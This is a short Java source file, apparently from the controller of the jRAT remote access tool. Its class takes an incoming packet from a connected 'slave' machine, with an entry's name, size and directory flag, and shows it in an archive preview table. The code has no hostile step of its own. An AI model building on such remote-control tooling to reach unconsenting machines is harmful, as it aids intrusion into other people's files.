package se.jrat.controller.packets.incoming;

import iconlib.FileIconUtils;

import java.io.DataInputStream;

import javax.swing.Icon;

import se.jrat.common.utils.DataUnits;
import se.jrat.controller.Slave;
import se.jrat.controller.ui.frames.FramePreviewZip;

public class Packet45ArchivePreview extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		boolean dir = slave.readBoolean();
		String name = slave.readLine();
		String filesize = DataUnits.getAsString(slave.readLong());

		FramePreviewZip frame = FramePreviewZip.INSTANCES.get(slave);

		if (frame != null) {
			Icon icon = FileIconUtils.getIconFromExtension(name, dir);

			frame.getModel().addRow(new Object[] { icon, name, dir ? "" : filesize });
		}
	}

}
